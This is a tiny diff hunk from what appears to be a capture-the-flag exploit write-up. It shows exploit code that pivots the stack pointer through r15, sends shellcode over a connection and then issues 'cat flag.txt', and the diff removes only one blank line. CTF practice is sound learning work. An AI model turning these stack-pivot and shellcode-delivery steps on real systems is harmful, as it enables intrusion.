@@ -133,7 +133,6 @@ Then we write the address of the ROP chain to rsp to trigger the execution.
 execute("mov r15, rsp; ret")
 execute("inc r15")
 CODE = asm("mov rsp,r15; ret").ljust(4, asm("nop"))
-
 con.send(CODE)
 con.send(shellcode)
 con.send("cat flag.txt\n")
